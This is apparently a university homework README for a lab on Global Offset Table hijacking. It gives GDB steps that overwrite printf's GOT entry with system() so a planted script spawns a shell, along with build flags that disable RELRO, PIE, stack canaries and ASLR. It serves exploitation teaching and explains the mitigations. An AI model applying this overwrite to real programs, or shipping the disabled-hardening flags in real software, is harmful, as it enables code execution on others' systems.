# Homework 08: Global Offset Table (GOT) Hijacking Exploitation - Bypassing Non-Executable Stack Protection

**Author:** Vedant Bhalerao (vedantb@umd.edu)  
**Course:** ENPM691

## Overview

This assignment demonstrates the exploitation of Global Offset Table (GOT) hijacking techniques to bypass Non-Executable (NX) stack protection. The exploit leverages the writable nature of GOT entries under partial RELRO to redirect legitimate function calls to malicious targets, achieving arbitrary code execution and spawning a shell. The methodology includes analysis of PLT/GOT dynamic linking mechanisms, manual GOT overwrite exploitation, and demonstration of both legitimate and malicious update processes using GDB and memory manipulation techniques.

> ⚠️ **Warning:** This assignment demonstrates advanced exploitation techniques for educational purposes only. These programs are designed to run in a controlled, isolated lab environment (VM) with security mitigations disabled. **NEVER** run these programs on production systems. See `SAFE_USAGE.md` in the repository root.

## Building

**Note:** This assignment requires:
- 32-bit compilation support
- GDB with pwndbg extension
- readelf and objdump tools

Install dependencies:
```bash
# On Debian/Ubuntu:
sudo apt-get install gcc-multilib binutils

# On Fedora:
sudo dnf install glibc-devel.i686 gcc-c++-i686 binutils
```

```bash
make              # Build got binary
make disable-aslr # Disable ASLR (required for exploit, needs sudo)
make setup-script # Setup malicious script in PATH
make debug        # Run with GDB debugger
make checksec     # Check binary security settings
make show-got     # Show GOT/PLT information
make enable-aslr  # Re-enable ASLR when done
make remove-script # Remove malicious script when done
make clean        # Remove compiled binaries
```

## Programs

- **got** - Vulnerable program with buffer overflow
- **Your.sh** - Malicious script template that will be executed via GOT hijack

## Setup Instructions

1. **Build the binary:**
   ```bash
   make
   ```

2. **Disable ASLR (required for exploit to work with fixed addresses):**
   ```bash
   make disable-aslr
   # or manually:
   echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
   ```

3. **Setup malicious script in PATH:**
   ```bash
   make setup-script
   # or manually:
   mkdir -p ~/.local/bin
   cp src/Your.sh ~/.local/bin/Your
   chmod +x ~/.local/bin/Your
   # Ensure ~/.local/bin is in your PATH
   ```

4. **Verify binary security settings:**
   ```bash
   make checksec
   # Should show "No RELRO" or "Partial RELRO"
   ```

## GOT Hijacking Exploitation

The exploit works by overwriting the GOT entry for `printf` to point to `system`, then when `printf` is called, it actually executes `system` with the format string as a command.

### Step 1: Natural PLT/GOT Observation

First, observe the legitimate dynamic linking process:

```bash
gdb -q ./got
(gdb) break main
(gdb) run
(gdb) got
(gdb) watch *0x804b210  # Watch printf GOT entry
(gdb) continue
# Enter some input
(gdb) got
# Observe GOT entry changed from PLT stub to libc address
```

### Step 2: Manual GOT Overwrite

Perform the GOT hijack:

```bash
gdb -q ./got
(gdb) break main
(gdb) run
# Enter input when prompted
(gdb) print system
# Note the system() address (e.g., 0xf7dba220)
(gdb) break *main+15  # Break after gets() but before printf()
(gdb) continue
(gdb) set {int}0x804b210 = 0xf7dba220  # Overwrite printf GOT with system address
(gdb) got
# Verify: printf@GOT should now point to system
(gdb) continue
# Should execute: system("Your data is...")
# This will execute the "Your" script from PATH
```

### Finding GOT Addresses

To find GOT addresses:

```bash
# In GDB with pwndbg:
(gdb) got

# Or using readelf:
readelf -r got

# Or using objdump:
objdump -R got
```

## Expected Results

When the exploit succeeds:

1. The GOT entry for `printf` is overwritten with `system` address
2. When `printf("Your data is %d bytes.\n", ...)` is called, it actually executes `system("Your data is %d bytes.\n", ...)`
3. The system looks for a command named "Your" in PATH
4. The malicious script at `~/.local/bin/Your` is executed
5. A shell is spawned

Example output:
```
$ gdb -q ./got
(gdb) [exploitation steps...]
(gdb) continue
GOT Hijack Successful!
$ whoami
vedant
$ exit
```

## Compilation Flags

The Makefile uses specific flags:
- `-m32` - 32-bit (IA-32) executable
- `-fno-stack-protector` - Disable stack canaries
- `-no-pie` - Disable position-independent executable
- `-mpreferred-stack-boundary=2` - Control stack alignment
- `-fno-pic` - Disable position-independent code
- `-Wl,-z,norelro` - **Disable RELRO** (keeps GOT writable - critical for exploit)

**Note:** The `-Wl,-z,norelro` flag is essential. With full RELRO (`-Wl,-z,relro,-z,now`), the GOT becomes read-only after initial linking, preventing this attack.

## Security Notes

This assignment demonstrates GOT hijacking in a controlled environment. Key points:

- **No RELRO**: GOT entries remain writable, allowing overwrite
- **NX Protection Bypass**: GOT hijacking bypasses NX by redirecting legitimate function calls
- **ASLR Disabled**: Required for exploit to work with fixed addresses
- **No Stack Canaries**: Disabled to allow buffer overflow (though not strictly needed for GOT hijack)

In production systems with full protections:
- **Full RELRO** (`-Wl,-z,relro,-z,now`) makes GOT read-only, preventing this attack
- **ASLR** would randomize addresses, requiring information leakage
- **Stack Canaries** would detect buffer overflows
- **PIE** would make addresses unpredictable

**Always re-enable ASLR and remove the malicious script when done:**
```bash
make enable-aslr
make remove-script
```

## GOT/PLT Background

- **PLT (Procedure Linkage Table)**: Contains stub code that jumps to GOT entries
- **GOT (Global Offset Table)**: Contains actual function addresses (initially points to PLT stubs, then updated to libc addresses)
- **Lazy Binding**: Functions are resolved on first call via `_dl_fixup`
- **RELRO**: Makes GOT read-only after initial linking (prevents GOT hijacking)

See `docs/` folder for detailed write-up and analysis.

